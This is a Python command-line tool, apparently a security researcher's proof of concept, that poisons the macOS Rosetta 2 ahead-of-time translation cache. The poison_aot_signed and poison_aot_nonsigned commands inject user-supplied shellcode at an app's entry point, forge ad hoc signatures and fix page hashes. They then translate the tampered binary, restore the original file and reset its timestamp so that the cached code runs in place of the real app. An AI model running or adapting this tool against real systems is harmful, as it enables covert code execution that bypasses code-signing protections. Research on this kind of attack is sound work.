#
# (c) FFRI Security, Inc., 2023 / Author: FFRI Security, Inc.
#
import datetime
import glob
import hashlib
import mmap
import os
import shutil
import subprocess
from collections import defaultdict
from ctypes import BigEndianStructure, c_uint8, c_uint16, c_uint32, c_uint64, sizeof
from enum import IntEnum
from typing import Any, Callable, Dict, List, Tuple

import typer

app = typer.Typer()


class SubBlob(BigEndianStructure):
    _fields_ = (("type", c_uint32), ("offset", c_uint32))


class SubBlobType(IntEnum):
    CodeDirectory = 0
    Requirements = 2
    Entitlements = 5
    EntitlementsDer = 7  # NOTE: https://developer.apple.com/documentation/kernel/2869934-anonymous/csmagic_embedded_der_entitlements
    AlternateCodeDirectory = 0x1000
    CMSBlob = 0x10000
    Identification = 0x10001


def bytes_to_hexdigest(b: bytes) -> str:
    return "".join(f"{i:02x}" for i in b)


def get_code_signature_cmd(path: str) -> Tuple[int, int]:
    otool_output = (
        subprocess.run(["otool", "-l", path], stdout=subprocess.PIPE, check=True)
        .stdout.decode("utf-8")
        .split("\n")
    )

    idx = next(j for j, i in enumerate(otool_output) if "LC_CODE_SIGNATURE" in i)

    dataoff = int(otool_output[idx + 2].strip().split(" ")[1])
    datasize = int(otool_output[idx + 3].strip().split(" ")[1])
    typer.secho("load command for code signature is...", fg=typer.colors.GREEN)
    typer.secho(f"data offset is {hex(dataoff)}", fg=typer.colors.GREEN)
    return dataoff, datasize


def get_entrypoint_offset(path: str) -> int:
    otool_output = (
        subprocess.run(["otool", "-l", path], stdout=subprocess.PIPE, check=True)
        .stdout.decode("utf-8")
        .split("\n")
    )

    idx = next(j for j, i in enumerate(otool_output) if "LC_MAIN" in i)

    entryoff = int(otool_output[idx + 2].strip().split(" ")[1])
    typer.secho(f"entrypoint offset is {hex(entryoff)}", fg=typer.colors.GREEN)
    return entryoff


def create_super_blob_type(num_blobs: int) -> type:
    class SuperBlobHeader(BigEndianStructure):
        _fields_ = (
            ("magic", c_uint32),
            ("length", c_uint32),
            ("numBlobs", c_uint32),
            ("subBlobs", SubBlob * num_blobs),
        )

        def __str__(self) -> str:
            return "\n".join(
                [
                    "SuperBlob Header:",
                    f"\tmagic: {hex(self.magic)}",
                    f"\tlength: {hex(self.length)}",
                    f"\tnumBlobs: {self.numBlobs}",
                ]
                + [
                    f"\ttype: {hex(self.subBlobs[i].type)}\n\t"
                    + f"offset: {hex(self.subBlobs[i].offset)}"
                    for i in range(self.numBlobs)
                ]
            )

        def has_valid_magic(self) -> bool:
            return self.magic == 0xFADE0CC0

    return SuperBlobHeader


def create_super_blob_type_for_parsing(mm: bytes) -> type:
    num_blobs = int.from_bytes(mm[8:12], byteorder="big")
    typer.secho(f"num_blobs = {num_blobs}", fg=typer.colors.GREEN)
    return create_super_blob_type(num_blobs)


class GenericSubBlob(BigEndianStructure):
    _fields_ = (
        ("magic", c_uint32),
        ("length", c_uint32),
    )

    def __str__(self) -> str:
        return "\n".join(
            [
                f"\tmagic: {hex(self.magic)} ({self.magic_to_name(self.magic)})",
                f"\tlength: {hex(self.length)}",
            ]
        )

    def load_blob_data(self, sub_blob_mm: bytes) -> None:
        self.blob = sub_blob_mm[sizeof(GenericSubBlob) : self.length]

    def save_blob_data(self, output_fname: str, blob_name: str) -> None:
        typer.secho(f"{blob_name} is saved to {output_fname}", fg=typer.colors.GREEN)
        with open(output_fname, "wb") as fout:
            fout.write(self.blob)

    @staticmethod
    def magic_to_name(magic: int) -> str:
        magic_to_name_dict = defaultdict(
            lambda: "None",
            [
                (0xFADE7171, "Entitlement"),
                (0xFADE7172, "Entitlement Der"),
                (0xFADE0C01, "Requirement"),
                (0xFADE0C02, "Code Directory"),
                (0xFADE0B01, "CMS Blob"),
            ],
        )
        return magic_to_name_dict[magic]


class RequirementsSubBlob(GenericSubBlob):
    def parse_requirements(self, sub_blob_mm: bytes) -> None:
        self.requirements = sub_blob_mm[sizeof(GenericSubBlob) : self.length]
        self.requirements_sha1 = hashlib.sha1(sub_blob_mm[0 : self.length]).hexdigest()
        self.requirements_sha256 = hashlib.sha256(
            sub_blob_mm[0 : self.length]
        ).hexdigest()
        # TODO: parse requirements blob

    def __str__(self) -> str:
        return "\n".join(
            [
                "Requirements:",
                super().__str__(),
                "\tsha1: " + self.requirements_sha1,
                "\tsha256: " + self.requirements_sha256,
            ]
        )


class EntitlementsSubBlob(GenericSubBlob):
    def parse_entitlements(self, sub_blob_mm: bytes) -> None:
        self.entitlements = sub_blob_mm[sizeof(GenericSubBlob) : self.length]
        self.entitlements_sha1 = hashlib.sha1(sub_blob_mm[0 : self.length]).hexdigest()
        self.entitlements_sha256 = hashlib.sha256(
            sub_blob_mm[0 : self.length]
        ).hexdigest()

    def __str__(self) -> str:
        return "\n".join(
            [
                "EntitlementsBlob:",
                super().__str__(),
                "\tsha1: " + self.entitlements_sha1,
                "\tsha256: " + self.entitlements_sha256,
            ]
        )


class CodeDirectorySubBlob(BigEndianStructure):
    # NOTE: assuming that code directory's version is greater that 0x20400
    _fields_ = (
        ("cd_magic", c_uint32),
        ("length", c_uint32),
        ("version", c_uint32),
        ("flags", c_uint32),
        ("hashOffset", c_uint32),
        ("identOffset", c_uint32),
        ("nSpecialSlots", c_uint32),
        ("nCodeSlots", c_uint32),
        ("codeLimit", c_uint32),
        ("hashSize", c_uint8),
        ("hashType", c_uint8),
        ("platform", c_uint8),
        ("pageSize", c_uint8),
        ("spare2", c_uint32),
        ("scatterOffset", c_uint32),
        ("teamOffset", c_uint32),
        ("spare3", c_uint32),
        ("codeLimit64", c_uint64),
        ("execSegmentBase", c_uint64),
        ("execSegmentLimit", c_uint64),
        ("execSegmentFlags", c_uint64),
        # NOTE: fields for the version 0x20500
        ("runtime", c_uint32),
        ("preEncryptedOffset", c_uint32),
        # NOTE: fields for the version 0x20600
        ("linkageHashType", c_uint8),
        ("linkageTruncated", c_uint8),
        ("spare4", c_uint16),
        ("linkageOffset", c_uint32),
        ("linkageSize", c_uint32),
    )

    def __str__(self) -> str:
        return "\n".join(
            [
                "CodeDirectoryBlob:",
                f"\tcd_magic: {hex(self.cd_magic)}",  # signature of sub blob
                f"\tlength: {hex(self.length)}",  # size of sub blob
                f"\tversion: {hex(self.version)}",  #
                f"\tflags: {hex(self.flags)}",  #
                f"\thashOffset: {hex(self.hashOffset)}",  # offset of hash slots
                f"\tidentOffset: {hex(self.identOffset)}",  # offset of identification
                f"\tnSpecialSlots: {hex(self.nSpecialSlots)}",  # number of special slots
                f"\tnCodeSlots: {hex(self.nCodeSlots)}",  # number of code slots
                f"\tcodeLimit: {hex(self.codeLimit)}",
                f"\thashSize: {hex(self.hashSize)}",
                f"\thashType: {hex(self.hashType)}",
                f"\tplatform: {hex(self.platform)}",
                f"\tpageSize: {hex(self.pageSize)}",
                f"\tspare2: {hex(self.spare2)}",
                f"\tscatterOffset: {hex(self.scatterOffset)}",
                f"\tteamOffset: {hex(self.teamOffset)}",
                f"\tspare3: {hex(self.spare3)}",
                f"\tcodeLimit64: {hex(self.codeLimit64)}",
                f"\texecSegmentBase: {hex(self.execSegmentBase)}",
                f"\texecSegmentLimit: {hex(self.execSegmentLimit)}",
                f"\texecSegmentFlags: {hex(self.execSegmentFlags)}",  # executable segment flags (cs_blobs.h https://opensource.apple.com/source/xnu/xnu-4570.61.1/osfmk/kern/cs_blobs.h.auto.html)
                # NOTE: fields for version 0x20500
                f"\truntime: {hex(self.runtime)}",
                f"\tpreEncryptedOffset: {hex(self.preEncryptedOffset)}",
                # NOTE: fields for version 0x20600
                f"\tlinkageHashType: {hex(self.linkageHashType)}",
                f"\tlinkageTruncated: {hex(self.linkageTruncated)}",
                f"\tspare4: {hex(self.spare4)}",
                f"\tlinkageOffset: {hex(self.linkageOffset)}",
                f"\tlinkageSize: {hex(self.linkageSize)}",
                "Special page slots:\n\t" + self.str_special_slots_info(),
                "Code page slots:\n\t" + self.str_code_slots_info(),
                "CDHash:\n\t" + self.cdhash,
            ]
        )

    def parse_linkage_hash(self, sub_blob_mm: bytes) -> None:
        self.linkage_hash = sub_blob_mm[
            self.linkageOffset : self.linkageOffset + self.linkageSize
        ]
        typer.secho(f"linkageHash: {bytes_to_hexdigest(self.linkage_hash)}")

    def parse_page_slots(self, sub_blob_mm: bytes) -> None:
        code_page_slots_mm = sub_blob_mm[self.hashOffset :]
        special_page_slots_mm = sub_blob_mm[
            self.hashOffset - self.nSpecialSlots * self.hashSize :
        ]
        hash_size = self.hashSize

        self.code_page_slots = [
            code_page_slots_mm[i * hash_size : (i + 1) * hash_size]
            for i in range(self.nCodeSlots)
        ]
        self.special_page_slots = [
            special_page_slots_mm[i * hash_size : (i + 1) * hash_size]
            for i in range(self.nSpecialSlots)
        ]

    def calc_cdhash(self, sub_blob_mm: bytes) -> None:
        if self.hashType == 2:
            self.cdhash = hashlib.sha256(sub_blob_mm).hexdigest()
        elif self.hashType == 1:
            self.cdhash = hashlib.sha1(sub_blob_mm).hexdigest()
        else:
            typer.secho(
                f"Unknown hash type {self.hashType}. So cannot calculate",
                err=True,
                fg=typer.colors.RED,
            )

    def str_special_slots_info(self) -> str:
        special_slots_names = [
            "Bound info.plist",
            "Requirements",
            "Resource Directory",  # hash value of _CodeSignature/CodeResources
            "Application Specific",  # unused
            "Entitlements",  # hash value of entitlements
            "DMG code signatures only",  # ?
            "Darwin 19: DER entitlements",  # ?
        ]
        return "\n\t".join(
            name + ": " + bytes_to_hexdigest(slot)
            for name, slot in zip(
                reversed(special_slots_names[: self.nSpecialSlots]),
                self.special_page_slots,
            )
        )

    def str_code_slots_info(self) -> str:
        return "\n\t".join(
            f"slots[{j:02x}]: " + bytes_to_hexdigest(slot)
            for j, slot in enumerate(self.code_page_slots)
        )


class CsHashType(IntEnum):
    CsHashTypeSha1 = 1
    CsHashTypeSha256 = 2
    CsHashTypeSha256Truncated = 3
    CsHashTypeSha384 = 4


class CodeSig:
    def __init__(self, path: str) -> None:
        if not os.path.exists(path):
            typer.secho(f"Cannot find {path}", err=True, fg=typer.colors.RED)
            return

        self.code_sig_offset, _ = get_code_signature_cmd(path)

        with open(path, "r+b") as fin:
            self.bytes_mm = mmap.mmap(fin.fileno(), 0)

        code_sig_mm = self.bytes_mm[self.code_sig_offset :]

        SuperBlobHeader = create_super_blob_type_for_parsing(code_sig_mm)
        self.super_blob_header = SuperBlobHeader.from_buffer_copy(
            code_sig_mm[0 : sizeof(SuperBlobHeader)]
        )

        typer.secho("Super Blob", fg=typer.colors.GREEN)
        typer.echo(self.super_blob_header)
        self.sub_blobs = self.parse_sub_blobs(code_sig_mm, self.super_blob_header)

        code_limit = self.sub_blobs["CodeDirectory"].codeLimit
        page_size = self.sub_blobs["CodeDirectory"].pageSize

        self.actual_page_slots_sha1 = self.calc_actual_code_page_slots(
            self.bytes_mm, code_limit, 1 << page_size, hashlib.sha1
        )
        self.actual_page_slots_sha256 = self.calc_actual_code_page_slots(
            self.bytes_mm, code_limit, 1 << page_size, hashlib.sha256
        )

    def fix_mismatched_page_slots(
        self, code_directory: CodeDirectorySubBlob, mismatched_page_slots_ids: List[int]
    ) -> None:
        page_slots_offset = (
            self.code_sig_offset + code_directory.offset + code_directory.hashOffset
        )
        hash_size = code_directory.hashSize
        if code_directory.hashType == 1:
            actual_page_slots = self.actual_page_slots_sha1
        elif code_directory.hashType == 2:
            actual_page_slots = self.actual_page_slots_sha256
        else:
            typer.secho(f"Unknown hash type", fg=typer.colors.RED)
            return

        for id_ in mismatched_page_slots_ids:
            self.bytes_mm[
                page_slots_offset
                + hash_size * id_ : page_slots_offset
                + hash_size * (id_ + 1)
            ] = actual_page_slots[id_]

    def find_mismatched_page_slots(
        self, code_directory: CodeDirectorySubBlob
    ) -> List[int]:
        if code_directory.hashType == 1:
            actual_page_slots = self.actual_page_slots_sha1
        elif code_directory.hashType == 2:
            actual_page_slots = self.actual_page_slots_sha256
        else:
            typer.secho(f"Unknown hash type", fg=typer.colors.RED)
            return []

        mismatched_page_slots_ids = []
        for id_, (slot0, slot1) in enumerate(
            zip(actual_page_slots, code_directory.code_page_slots)
        ):
            if slot0 != slot1:
                typer.secho(f"Mismatched page slot is found", fg=typer.colors.GREEN)
                mismatched_page_slots_ids.append(id_)
        return mismatched_page_slots_ids

    @staticmethod
    def calc_actual_code_page_slots(
        bytes_mm: bytes, code_limit: int, page_size: int, hash_func: Callable
    ) -> List[bytes]:
        code_bytes_mm = bytes_mm[0:code_limit]
        num_page_slots = (
            int(code_limit / page_size)
            if code_limit % page_size == 0
            else int(code_limit / page_size) + 1
        )
        return [
            hash_func(code_bytes_mm[i * page_size : (i + 1) * page_size]).digest()
            for i in range(num_page_slots)
        ]

    @staticmethod
    def parse_sub_blobs(
        code_sig_mm: bytes, super_blob_header: Any
    ) -> Dict[str, BigEndianStructure]:
        sub_blobs = dict()
        for i in range(super_blob_header.numBlobs):
            sub_blob_type = super_blob_header.subBlobs[i].type
            sub_blob_offset = super_blob_header.subBlobs[i].offset
            sub_blob_mm = code_sig_mm[sub_blob_offset:]

            if (
                sub_blob_type == SubBlobType.CodeDirectory
                or sub_blob_type == SubBlobType.AlternateCodeDirectory
            ):
                code_directory_blob = CodeDirectorySubBlob.from_buffer_copy(
                    sub_blob_mm[0 : sizeof(CodeDirectorySubBlob)]
                )
                code_directory_blob.parse_page_slots(
                    sub_blob_mm[0 : code_directory_blob.length]
                )
                if code_directory_blob.version >= 0x20600:
                    code_directory_blob.parse_linkage_hash(
                        sub_blob_mm[0 : code_directory_blob.length]
                    )
                code_directory_blob.calc_cdhash(
                    sub_blob_mm[0 : code_directory_blob.length]
                )
                code_directory_blob.offset = sub_blob_offset
                sub_blobs[SubBlobType(sub_blob_type).name] = code_directory_blob

                typer.secho("CodeDirectory", fg=typer.colors.GREEN)
                typer.echo(code_directory_blob)
                typer.echo(SubBlobType.CodeDirectory.name)

            elif sub_blob_type == SubBlobType.Entitlements:
                entitlements_blob = EntitlementsSubBlob.from_buffer_copy(
                    sub_blob_mm[0 : sizeof(EntitlementsSubBlob)]
                )
                entitlements_blob.parse_entitlements(sub_blob_mm)
                entitlements_blob.offset = sub_blob_offset
                sub_blobs[SubBlobType(sub_blob_type).name] = entitlements_blob

                typer.secho("Entitlements", fg=typer.colors.GREEN)
                typer.echo(entitlements_blob)

            elif sub_blob_type == SubBlobType.Requirements:
                requirements_blob = RequirementsSubBlob.from_buffer_copy(
                    sub_blob_mm[0 : sizeof(RequirementsSubBlob)]
                )
                requirements_blob.parse_requirements(sub_blob_mm)
                requirements_blob.offset = sub_blob_offset
                sub_blobs[SubBlobType(sub_blob_type).name] = requirements_blob

                typer.secho("Requirements", fg=typer.colors.GREEN)
                typer.echo(requirements_blob)

            elif sub_blob_type == SubBlobType.CMSBlob:
                cms_blob = GenericSubBlob.from_buffer_copy(
                    sub_blob_mm[0 : sizeof(GenericSubBlob)]
                )
                cms_blob.load_blob_data(sub_blob_mm)
                cms_blob.offset = sub_blob_offset
                sub_blobs[SubBlobType(sub_blob_type).name] = cms_blob

                typer.echo("CMSBlob")
                typer.echo(cms_blob)
                # cms_blob.save_blob_data("blobwrapper.txt", "CMSBlob")

            elif sub_blob_type == SubBlobType.EntitlementsDer:
                entitlements_der_blob = GenericSubBlob.from_buffer_copy(
                    sub_blob_mm[0 : sizeof(GenericSubBlob)]
                )
                entitlements_der_blob.load_blob_data(sub_blob_mm)
                entitlements_der_blob.offset = sub_blob_offset
                sub_blobs[SubBlobType(sub_blob_type).name] = entitlements_blob

                typer.echo("EntitlementsDer")
                typer.echo(entitlements_der_blob)
                entitlements_der_blob.save_blob_data(
                    "entitlements.der", "EntitlementsDer"
                )

            else:
                unknown_blob = GenericSubBlob.from_buffer_copy(
                    sub_blob_mm[0 : sizeof(GenericSubBlob)]
                )
                unknown_blob.load_blob_data(sub_blob_mm)
                unknown_blob.offset = sub_blob_offset

                typer.secho(
                    f"Unknown SubBlob Type ({hex(sub_blob_type)})", fg=typer.colors.RED
                )
                typer.echo(unknown_blob)
        return sub_blobs


def clear_codesig(path: str) -> None:
    if not os.path.exists(path):
        typer.secho(f"Cannot find {path}", err=True, fg=typer.colors.RED)
        return

    dataoff, datasize = get_code_signature_cmd(path)

    with open(path, "r+b") as fin:
        bytes_mm = mmap.mmap(fin.fileno(), 0)

    for i in range(datasize):
        bytes_mm[dataoff + i] = 0


def inject_shellcode(path: str, shellcode_path: str) -> None:
    entryoff = get_entrypoint_offset(path)
    with open(path, "r+b") as fin0, open(shellcode_path, "r+b") as fin1:
        bytes_mm = mmap.mmap(fin0.fileno(), 0)
        shellcode_mm = mmap.mmap(fin1.fileno(), 0)

        for i, c in enumerate(shellcode_mm):
            bytes_mm[entryoff + i] = ord(c)


def inject_adhoc_sig(path: str) -> str:
    valid_bin_path = os.path.basename(path) + ".valid"

    typer.secho(
        f"Make backup for {path}. Saved to {valid_bin_path}.", fg=typer.colors.GREEN
    )
    shutil.copy(path, valid_bin_path)

    typer.secho("Replace signature with adhoc one", fg=typer.colors.GREEN)
    subprocess.run(["codesign", "--remove-signature", path], check=True)
    subprocess.run(["codesign", "--sign", "-", path], check=True)

    dataoff, datasize = get_code_signature_cmd(path)
    with open(path, "r+b") as fin:
        bytes_mm = mmap.mmap(fin.fileno(), 0)
        adhoc_sig = list(bytes_mm[dataoff:])
    adhoc_sig_size = datasize

    shutil.copy(valid_bin_path, path)

    clear_codesig(path)
    dataoff, datasize = get_code_signature_cmd(path)
    with open(path, "r+b") as fin:
        bytes_mm = mmap.mmap(fin.fileno(), 0)
        for i in range(min(adhoc_sig_size, datasize)):
            bytes_mm[dataoff + i] = adhoc_sig[i]

    return valid_bin_path


def copy_exec_to_fat32_image(exec_path: str, mount_dir: str) -> str:
    exec_name = os.path.basename(exec_path)
    copied_bundle_path = os.path.join(mount_dir, exec_name)

    typer.secho(f"Converting fat binaries to thin binaries if needed")
    if os.path.isdir(exec_name):
        # Application bundle
        for f in glob.glob(os.path.join(exec_name, "Contents", "MacOS", "*")):
            output = subprocess.run(
                ["file", f], stdout=subprocess.PIPE, check=True
            ).stdout.decode("utf-8")
            if "Mach-O universal binary" in output:
                os.system(f'lipo -thin x86_64 "{f}" -output "{f}"')
    else:
        # Standalone executable
        output = subprocess.run(
            ["file", exec_name], stdout=subprocess.PIPE, check=True
        ).stdout.decode("utf-8")
        if "Mach-O universal binary" in output:
            os.system(f'lipo -thin x86_64 "{exec_name}" -output "{exec_name}"')

    typer.secho(f"Removing previous copied bundle", fg=typer.colors.GREEN)
    os.system(f'rm -rf "{copied_bundle_path}"')

    typer.secho(f"Copying to {copied_bundle_path}", fg=typer.colors.GREEN)
    os.system(f'cp -R "{exec_path}" "{mount_dir}"')

    return os.path.join(mount_dir, exec_path)


def mount_fat32_image() -> str:
    mount_point = "/tmp/mnt"
    if not os.path.exists(mount_point):
        os.system("hdiutil create -size 500m -volname temp -fs fat32 /tmp/temp.dmg")
        os.system(f"mkdir -p {mount_point}")
        os.system(f"hdiutil attach -owners off -mountpoint {mount_point} /tmp/temp.dmg")
    return mount_point


def get_cur_time() -> str:
    dt_now = datetime.datetime.now()
    return dt_now.strftime("%m/%d/%Y %H:%M")


def inject_shellcode_and_sign(path: str, copied_path: str, shellcode_path: str) -> None:
    valid_bin_path = inject_adhoc_sig(path)
    inject_shellcode(path, shellcode_path)
    code_sig = CodeSig(path)
    mismatched_page_slots = code_sig.find_mismatched_page_slots(
        code_sig.sub_blobs["CodeDirectory"]
    )
    code_sig.fix_mismatched_page_slots(
        code_sig.sub_blobs["CodeDirectory"], mismatched_page_slots
    )

    if "AlternateCodeDirectory" in code_sig.sub_blobs.keys():
        mismatched_page_slots = code_sig.find_mismatched_page_slots(
            code_sig.sub_blobs["AlternateCodeDirectory"]
        )
        code_sig.fix_mismatched_page_slots(
            code_sig.sub_blobs["AlternateCodeDirectory"], mismatched_page_slots
        )
    adhoc_bin_path = os.path.basename(path) + ".adhoc"
    typer.echo(f"Saved specially-crafted adhoc-signed executable to {adhoc_bin_path}")
    shutil.copy(path, adhoc_bin_path)

    typer.secho("Get current time", fg=typer.colors.GREEN)
    cur_time = get_cur_time()

    typer.secho("Poisoning AoT cache file", fg=typer.colors.GREEN)
    typer.echo(f"{path} -> {copied_path}")
    os.system(f'cp "{path}" "{copied_path}"')
    os.system(f"SetFile -m '{cur_time}' \"{copied_path}\"")
    os.system(f'/Library/Apple/usr/libexec/oah/translate_tool "{copied_path}"')
    typer.echo(f"{valid_bin_path} -> {copied_path}")
    os.system(f'cp "{valid_bin_path}" "{copied_path}"')
    os.system(f"SetFile -m '{cur_time}' \"{copied_path}\"")
    typer.secho("Done", fg=typer.colors.GREEN)


def get_main_executable(bundle_path: str) -> str:
    main_exec_name, ext = os.path.splitext(os.path.basename(bundle_path))
    if ext != ".app":
        typer.secho(
            f"{bundle_path} seems not a application bundle", fg=typer.colors.RED
        )
        typer.secho(f"Treating {bundle_path} as a main executable", fg=typer.colors.RED)
        return bundle_path
    return os.path.join(bundle_path, "Contents/MacOS", main_exec_name)


def mount_and_copy_to_tmp_dir(bundle_path: str) -> Tuple[str, str]:
    bundle_full_path = os.path.abspath(bundle_path)
    bundle_name = os.path.basename(bundle_path)

    if os.path.exists(bundle_name):
        typer.secho(f"Removing previous tmp files", fg=typer.colors.GREEN)
        os.system(f"rm -rf '{bundle_name}'")

    typer.echo(f"cp -R '{bundle_full_path}' '{bundle_name}'")
    os.system(f"cp -R '{bundle_full_path}' '{bundle_name}'")

    mount_point = mount_fat32_image()
    copied_path = copy_exec_to_fat32_image(bundle_name, mount_point)

    app_cur_dir_main_exec = get_main_executable(bundle_name)
    app_tmp_mnt_main_exec = get_main_executable(copied_path)

    return app_cur_dir_main_exec, app_tmp_mnt_main_exec


@app.command()
def poison_aot_signed(bundle_path: str, shellcode_path: str) -> None:
    app_cur_dir_main_exec, app_tmp_mnt_main_exec = mount_and_copy_to_tmp_dir(
        bundle_path
    )
    inject_shellcode_and_sign(
        app_cur_dir_main_exec,
        app_tmp_mnt_main_exec,
        shellcode_path,
    )


def inject_shellcode_without_sign(copied_path: str, shellcode_path: str) -> None:
    entry_point = get_entrypoint_offset(copied_path)
    with open(shellcode_path, "rb") as fin:
        payload = list(fin.read())

    typer.secho("Injecting shellcode to entrypoint", fg=typer.colors.GREEN)
    with open(copied_path, "r+b") as fin:
        mm = mmap.mmap(fin.fileno(), 0)
        original_payload_at_entry = list(mm[entry_point : entry_point + len(payload)])
        for i, p in enumerate(payload):
            mm[entry_point + i] = p

    typer.secho("Poisoning AoT cache file", fg=typer.colors.GREEN)
    os.system(f'/Library/Apple/usr/libexec/oah/translate_tool "{copied_path}"')

    typer.secho("Restoring to original one", fg=typer.colors.GREEN)
    with open(copied_path, "r+b") as fin:
        mm = mmap.mmap(fin.fileno(), 0)
        for i, p in enumerate(original_payload_at_entry):
            mm[entry_point + i] = p
    typer.secho("Done", fg=typer.colors.GREEN)


@app.command()
def poison_aot_nonsigned(bundle_path: str, shellcode_path: str) -> None:
    _, app_tmp_mnt_main_exec = mount_and_copy_to_tmp_dir(bundle_path)
    inject_shellcode_without_sign(app_tmp_mnt_main_exec, shellcode_path)


@app.command()
def parse_codesig(path: str) -> None:
    code_sig = CodeSig(path)


if __name__ == "__main__":
    app()
